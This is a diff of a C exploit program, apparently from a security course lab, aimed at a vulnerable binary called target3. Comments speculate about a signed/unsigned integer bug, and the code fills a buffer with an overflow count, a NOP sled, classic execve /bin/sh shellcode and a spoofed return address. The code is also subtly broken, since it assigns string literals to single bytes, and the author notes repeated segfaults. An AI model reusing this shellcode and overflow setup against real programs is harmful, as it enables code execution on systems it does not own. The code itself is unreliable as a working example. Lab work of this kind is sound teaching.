@@ -8,8 +8,16 @@
 
 // need 2800
 // sizeof widget_t is 56 bytes
-// butts
+// butts <-- butts?
 
+
+// I'm pretty sure that the vulnerability has to do with line 47 of target3
+// line 47: count = (int)strtoul(argv[1], &in, 10);
+//
+// strtoul returns an unsigned int long, but count receives it as a signed int 
+// we can probably use this for l337 h4x0r1ng
+
+//So I tried doing this /\  and kept getting segfaults whenever the program entered memcpy(). It even segfaulted for 1 <= count < 50. No idea why yet.//I noticed that in the widget_t struct, there is a count variable. Are we supposed to have widget_t.count overwrite count ? Just a thought.
 struct widget_t {
   long double p;
   double x;
@@ -25,12 +33,22 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-  char buf[3000] = "2147483648,";
+  char buf[3000] = "4294967246, "; 
   int i = 0;
-  for (i; i < 56*50; i++){
-  	int x = 11+i;
-  	buf[x] = "\xff";
+	for  (i; i <12; i++) {
+		printf("%c", buf[i]);
+	}
+  for (i; i < (56*48) + 48; i++){    //leave room in buffer for shell code. After for-loop buf[2748] is next empty mem addr; 60 bytes to overflow 
+  	int x = 30+i;
+  	buf[x] = "\x90";
   }
+ 	buf[2748] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"  //the 60 bytes that cause overflow
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh"
+"\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\xaa\xff\xff\xbf";
+
   args[0] = TARGET;
   args[1] = buf;
   args[2] = NULL;
